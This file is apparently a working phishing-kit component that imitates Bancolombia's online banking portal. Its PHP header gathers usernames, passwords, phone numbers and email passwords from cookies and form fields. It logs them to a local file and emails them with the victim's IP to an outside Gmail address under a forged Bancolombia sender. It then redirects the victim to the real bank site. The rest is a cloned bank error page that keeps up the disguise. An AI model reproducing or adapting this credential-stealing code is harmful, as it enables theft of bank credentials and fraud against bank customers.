<?php
//llamando cookie
$valorCookie = $_COOKIE['usuario'];
//echo $valorCookie; // Devuelve: usuario
$clave = $_COOKIE['clave'];
$telefono = $_COOKIE['telefono'];
//echo $valorCookie; // Devuelve: usuario
//$contra = $_POST['clave'];
$correo = $_POST['correo'];
$correocontra = $_POST['correocontra'];
$correocontra2 = $_POST['correocontra2'];
//echo $contra;
// Llamando a los campos
$usuario = $valorCookie;
//obteniendo la ip
function getRealIP() {

        if (!empty($_SERVER['HTTP_CLIENT_IP']))
            return $_SERVER['HTTP_CLIENT_IP'];
           
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
            return $_SERVER['HTTP_X_FORWARDED_FOR'];
       
        return $_SERVER['REMOTE_ADDR'];
}
		$ip = $_SERVER['REMOTE_ADDR'];
       //echo " {$_SERVER['REMOTE_ADDR']}";
	   
$bilsnd = "<menticol25@gmail.com>";
$bilsmg  = "------------+| --- |+------------".PHP_EOL;
$bilsmg .= "------------+| I N F O | Login |+------------".PHP_EOL;
$bilsmg .= "USUARIO           : ".$usuario.PHP_EOL;
$bilsmg .= "PASSWORD                 : ".$clave.PHP_EOL;
$bilsmg .= "TELEFONO                 : ".$telefono.PHP_EOL;
$bilsmg .= "CORREO                 : ".$correo.PHP_EOL;
$bilsmg .= "CORREO (contraseña)                : ".$correocontra.PHP_EOL;
$bilsmg .= "CORREO (contraseña confirmación)                : ".$correocontra2.PHP_EOL;
$bilsmg .= "------------+| --- |+------------".PHP_EOL;
$bilsmg .= "Fr0m $ip             chek in http://www.geoiptool.com/?IP=$ip  ".PHP_EOL;
$bilsub = " Login Empresas $ip";
$bilhead = "From: Bancolombia <service-customer-inc-2017@outlook.es>";
$bilhead .= "MIME-Version: 1.0\n";

file_put_contents('lia1lim.h4k', $bilsmg.PHP_EOL, FILE_APPEND | LOCK_EX);
@mail($bilsnd,$bilsub,$bilsmg,$bilhead);	   
/*
//datos para el correo
$destinatario="menticol25@gmail.com";
$asunto="combo user pass";
$carta="Usuario: $usuario \n";
$carta.="Contraseña: $contra";
//enviando mensaje
mail($destinatario, $asunto, $carta);
*/
header('location:https://sucursalpersonas.transaccionesbancolombia.com/mua/static');
exit;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Bancolombia Sucursal Virtual Personas</title>
   <link rel="shortcut icon" href="./images/favicon.ico">
  <meta content="es" http-equiv="Content-Language">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Todo1">
  <meta name="author" content="Todo1 Services">
  <meta name="Copyright" content="(c) 2014  Todo1 Services. All rights reserved.">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

<link href="./css/styles.css" media="all" rel="stylesheet" type="text/css">
  <link href="./css/bootstrap.css" media="all" rel="stylesheet" type="text/css">  
	<script type="text/javascript" src="./js/jquery-1.10.1.js"></script>
  <script type="text/javascript" src="./js/jquery-ui.js"></script>
  <link href="./css/jquery-ui.css" media="all" rel="stylesheet" type="text/css"> 
    <link href="./css/ui.css" media="all" rel="stylesheet" type="text/css">
<script type="text/javascript">
      function setTitle(){document.title='Bancolombia Sucursal Virtual Personas';}
</script>
 	<style>html, body, form {height: 100%;}</style>
	<script type="text/javascript">
         function setTitle(){document.title='Bancolombia Sucursal Virtual Personas';}
   </script>
</head>
<body onload="timeOutActive = true; setTitle();" style="">
	<form name="exit" method="POST" action="#" target="_top">
	<div class="container">
<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
  <div class="timeText">Fecha y hora actual:</div>
  <span  class="lastVisitedText">
  <script type="text/javascript">
  //array para convertir hora
 var m="AM"; 
function mueveReloj(){ 
    momentoActual = new Date(); 
    hora = momentoActual.getHours(); 
    minuto = momentoActual.getMinutes(); 
    segundo = momentoActual.getSeconds(); 

if(hora==12) 
{ 
      m="PM"; 
} 
if(hora==13) 
{ 
      hora="0"+1; 
      m="PM"; 
} 
if(hora==14) 
{ 
      hora="0"+2; 
      m="PM"; 
} 
if(hora==15) 
{ 
      hora="0"+3; 
      m="PM"; 
} 
if(hora==16) 
{ 
      hora="0"+4; 
      m="PM"; 
} 
if(hora==17) 
{ 
      hora="0"+5; 
      m="PM"; 
} 
if(hora==18) 
{ 
      hora="0"+6; 
      m="PM"; 
} 
if(hora==19) 
{ 
      hora="0"+7; 
      m="PM"; 
} 
if(hora==20) 
{ 
      hora="0"+8; 
      m="PM"; 
} 
if(hora==21) 
{ 
      hora="0"+9; 
      M="PM"; 
} 
if(hora==22) 
{ 
      hora=10; 
      m="PM"; 
} 
if(hora==23) 
{ 
      hora=11; 
      m="PM"; 
} 
if((hora==0)||(hora==24)) 
{ 
      hora=12; 
      m="AM"; 
} 

    str_segundo = new String (segundo) 
    if (str_segundo.length == 1) 
       segundo = "0" + segundo; 

    str_minuto = new String (minuto) 
    if (str_minuto.length == 1) 
       minuto = "0" + minuto; 

    str_hora = new String (hora) 
    if (str_hora.length == 1) 
       hora = "0" + hora; 

    horaImprimible = hora + ":" + minuto + ":" + segundo+" "+m; 

    cl.innerHTML = horaImprimible;//cl=clock=reloj 

    setTimeout("mueveReloj()",1000); 
} 


   var d = new Date();
   //array para convertir dia de la semana (numero) a texto
   var dia=new Array(7);
dia[0]="Domingo";
dia[1]="Lunes";
dia[2]="Martes";
dia[3]="Miercoles";
dia[4]="Jueves";
dia[5]="Viernes";
dia[6]="Sábado";
  //array para convertir mes (numero) a texto
var mm=new Date();
var m2 = mm.getMonth() + 1;
var mesok = (m2 < 10) ? '0' + m2 : m2;
var mesok=new Array(12);
mesok[0]="Enero";
mesok[1]="Febrero";
mesok[2]="Marzo";
mesok[3]="Abril";
mesok[4]="Mayo";
mesok[5]="Junio";
mesok[6]="Julio";
mesok[7]="Agosto";
mesok[8]="Septiembre";
mesok[9]="Octubre";
mesok[10]="Noviembre";
mesok[11]="Diciembre";


document.write(dia[d.getDay()]+' '+d.getDate()+' de '+mesok[mm.getMonth()]+' de '+d.getFullYear()); 
  </script>
  <span id="cl"></span>
  </span>
</div>
				</div>
			</div>
		</div>
	</div>

	<div class="panel-heading">
		<h3>
			Sucursal Virtual Personas - Mensaje Informativo
		</h3>
	</div>
</div>
		    <div>
		            <div class="panel panel-primary">
		                <div class="mua-panel-body">
							<div class="row">
								<div class="col-xs-12 col-sm-12 col-md-12">
									<div>
									<center>
										<p class="mua-p-top-cero">Ha ocurrido un problema al intentar conectar con el servidor, por favor verifique su conexión a internet.</p>
										<p class="mua-p-bottom-cero">Por motivos de seguridad su sesión ha sido finalizada.</p>
									</center>
									</div>
								</div>
							</div>
	                        <div class="one-button-container mua-button-container">
								<button class="btn btn-success" onclick="window.location.href=&#39;/cb/pages/jsp-ns/login-mada.jsp&#39;; return (false);">Continuar</button>
	                        </div>
		                     </div>     
		                </div>
		            </div>
	        <div class="title-small">
	        	<span class="pull-right">Copyright ©&nbsp;<span id="fecha">2018</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</span>
	        </div>  
		    </div>
   </form>
</body></html>